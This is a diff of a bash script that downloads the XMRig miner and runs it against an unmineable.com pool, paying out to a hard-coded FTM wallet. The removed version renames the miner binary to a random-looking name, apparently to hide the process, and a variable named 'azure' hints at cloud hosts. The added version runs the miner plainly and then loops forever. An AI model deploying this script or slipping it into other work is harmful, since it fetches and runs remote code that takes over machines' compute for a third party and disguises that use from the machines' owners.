@@ -1,21 +1,10 @@
-#!/bin/bash
-sudo apt-get update
-VERSION=6.3.1
-azure=mxsemsdnlkdj
-a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-apt-get install -y git wget screen
-mkdir /usr/share
-mkdir /usr/share/work
-rm -r /usr/share/work/xmrig-$VERSION
-wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
-mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
-rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
-mv xmrig $azure -n
-cp $azure "$cpuname"
-rm -f  xmrig
-POOL=rx-asia.unmineable.com:3333
-USERNAME=FTM:0x7ed09285aee02b826ea9fb1358a9a4108bd6230e
-ALGO=rx/0
-DONATE=1
-./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.Oktay-$RANDOM -p x -a $ALGO -k --tls
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
+tar xf xmrig-6.14.0-linux-x64.tar.gz
+cd xmrig-6.14.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u FTM:0x7ed09285aee02b826ea9fb1358a9a4108bd6230e.Oktay$RANDOM -p x
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
